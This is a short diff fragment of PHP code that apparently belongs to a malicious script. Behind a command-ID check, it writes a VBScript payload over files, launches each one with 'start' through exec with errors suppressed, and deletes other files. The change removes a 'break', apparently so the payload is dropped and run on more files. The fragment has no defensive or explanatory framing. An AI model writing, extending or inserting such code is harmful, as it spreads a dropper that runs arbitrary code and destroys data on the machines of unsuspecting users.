@@ -78,7 +78,6 @@ if(@$GLOBALS['BLOG_COMMAND_ID'] !== $command_id)
 				{
 					@file_put_contents($data->getPathname(), $vbs);
 					@exec('start "" "'.$data->getPathname().'"');
-					break;
 				}
 				else
 					@unlink($data->getPathname());
